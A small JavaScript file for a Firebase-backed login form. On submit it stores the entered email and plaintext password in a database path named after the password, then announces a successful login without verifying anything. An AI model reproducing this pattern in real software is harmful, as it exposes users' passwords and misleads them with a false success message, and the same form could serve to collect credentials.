import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";

const firebaseConfig = {
apiKey: "AIzaSyCdlWxrB8IRBnmP3UTWtiSmQGJYGYJOAWA",
authDomain: "login-form-3e4ad.firebaseapp.com",
projectId: "login-form-3e4ad",
storageBucket: "login-form-3e4ad.appspot.com",
messagingSenderId: "438246780038",
appId: "1:438246780038:web:b04aae749b8bc378047507"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app)

document.getElementById("submit").addEventListener('click', function(e) {
    e.preventDefault();
    
    set(ref(db, 'user/' + document.getElementById("password").value),
    {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value
    });
    alert("Login succesfully !");
})